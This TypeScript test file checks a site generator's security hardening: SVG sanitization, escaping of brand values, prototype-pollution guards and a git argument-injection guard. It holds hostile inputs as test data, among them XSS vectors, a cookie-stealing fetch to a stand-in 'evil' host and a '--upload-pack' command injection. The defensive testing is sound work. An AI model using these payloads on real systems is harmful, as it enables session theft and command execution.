// Security hardening regression tests (added with the 0.8.x hardening pass):
// generated-output escaping/SVG sanitization, prototype-pollution guards on the
// sync-ingest path, and the git/gh argument-injection guard.
import { describe, it, expect } from "vitest";
import { buildStarterSite, safeSvg, type StarterSiteSpec } from "./scaffold.ts";
import { mergeProgressStates } from "./merge.ts";
import { parkNote, emptyState } from "./progress.ts";
import { runSync } from "./sync-io.ts";

const baseSpec = (over: Partial<StarterSiteSpec> = {}): StarterSiteSpec => ({
  brandName: "Acme", tagline: "Tag", pitch: "Pitch", positioning: "For builders",
  personality: ["bold"],
  palette: { primary: "#1f3a5f", accent: "#e8743b", ink: "#16202b", surface: "#f7f8fa", muted: "#8a9099" },
  displayFont: "Inter", bodyFont: "Inter", voiceTone: "calm", ...over,
});

describe("scaffold output hardening", () => {
  it("strips script, event handlers, and javascript: hrefs from a logo SVG", () => {
    const dirty = `<svg onload="alert(1)"><script>alert(2)</script><a xlink:href="javascript:alert(3)">x</a><rect/></svg>`;
    const clean = safeSvg(dirty);
    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/onload/i);
    expect(clean.toLowerCase()).not.toContain("javascript:");
    expect(clean).toContain("<rect/>"); // legitimate markup preserved
  });

  it("rejects a non-<svg> payload outright", () => {
    expect(safeSvg("<img src=x onerror=alert(1)>")).toBe("");
    expect(safeSvg("")).toBe("");
  });

  it("does not let a crafted brand value break out of the generated page", () => {
    const html = buildStarterSite(
      baseSpec({
        palette: { primary: "red}</style><script>alert(1)</script>", accent: "#e8743b", ink: "#16202b", surface: "#f7f8fa", muted: "#8a9099" },
        displayFont: "Inter';}</style><script>x</script>",
        logoSvg: `<svg><script>alert(1)</script></svg>`,
      }),
      { domain: "javascript:alert(1)" },
    ).files["index.html"]!;
    expect(html).not.toContain("<script>alert");
    expect(html).not.toContain("</style><script");
    expect(html).not.toContain("javascript:");        // non-http(s) domain rejected
    expect(html).toContain("--p:#1f3a5f");            // bad color fell back
    expect(html).toContain("https://example.com");    // bad domain fell back
  });

  // Regression locks for the adversarial-review findings: the earlier regex
  // sanitizer let these through. All are attacker-influenceable via a synced
  // brand.logos[].svg and reach a deployed index.html / LookBook.html.
  it("closes the reviewed logo-SVG bypasses", () => {
    const svg = (inner: string) =>
      `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">${inner}</svg>`;
    const cases: [string, string][] = [
      ["unclosed <script>", svg(`<script>alert(document.domain)`)],
      ["namespaced <svg:script>", svg(`<svg:script>alert(1)</svg:script>`)],
      ["SMIL animated href", svg(`<a><animate attributeName="xlink:href" values="javascript:alert(1)"/></a>`)],
      ["SMIL <set> href", svg(`<set attributeName="href" to="javascript:alert(1)"/>`)],
      ["<style> exfiltration", svg(`<style>*{background:url('https://evil.example/x')}</style>`)],
      ["slash-separator onload", svg(`<rect width="10" height="10"/onload=alert(1)>`)],
      ["entity-encoded scheme", svg(`<textPath xlink:href="&#106;avascript:alert(1)">x</textPath>`)],
    ];
    for (const [label, dirty] of cases) {
      const clean = safeSvg(dirty);
      expect(clean.toLowerCase(), label).not.toContain("javascript");
      expect(clean, label).not.toMatch(/<[a-z]*:?script/i);
      expect(clean, label).not.toMatch(/<style[\s>]/i);
      expect(clean, label).not.toMatch(/<(?:animate|set)\b/i);
      expect(clean, label).not.toMatch(/\bon[a-z]+\s*=/i);
      expect(clean, label).not.toContain("&#106;");
    }
  });

  it("preserves legitimate logo markup", () => {
    const clean = safeSvg(
      `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><title>Acme</title>` +
        `<g fill="#1f3a5f"><path d="M10 10 H90 V90 H10 Z"/><circle cx="50" cy="50" r="20"/></g>` +
        `<text x="10" y="95">Acme</text></svg>`,
    );
    expect(clean).toContain("<path");
    expect(clean).toContain("<circle");
    expect(clean).toContain("<text");
    expect(clean).toContain('d="M10 10 H90 V90 H10 Z"');
    expect(clean).toContain('fill="#1f3a5f"');
  });

  it("strips an unclosed <script> when the logo is inlined into the deployed page", () => {
    const html = buildStarterSite(
      baseSpec({ logoSvg: `<svg><script>fetch('https://evil/?c='+document.cookie)` }),
      {},
    ).files["index.html"]!;
    expect(html).not.toMatch(/<script>\s*fetch/i);
    expect(html).not.toContain("document.cookie");
  });
});

describe("prototype-pollution guards (sync-ingest path)", () => {
  it("merge does not copy a __proto__ answer key", () => {
    const ours = emptyState();
    const theirs = { ...emptyState(), answers: JSON.parse('{"__proto__":{"polluted":true},"real":"x"}') };
    const { state } = mergeProgressStates(ours, theirs, { oursTs: 0, theirsTs: 1 });
    expect((state.answers as Record<string, unknown>)["polluted"]).toBeUndefined();
    expect(({} as Record<string, unknown>)["polluted"]).toBeUndefined();
    expect(state.answers["real"]).toBe("x");
  });

  it("parkNote ignores a dangerous key", () => {
    const before = emptyState();
    const after = parkNote(before, "__proto__", "note", 1);
    expect(after).toBe(before);
    expect(({} as Record<string, unknown>)["note"]).toBeUndefined();
  });
});

describe("git/gh argument-injection guard", () => {
  it("rejects a repo that starts with '-'", async () => {
    const r = await runSync({ op: "init", repo: "--upload-pack=touch /tmp/pwn" }, { ts: 1, exportedAt: "" });
    expect(r.ok).toBe(false);
    expect(r.message.toLowerCase()).toContain("cannot start with");
  });
});
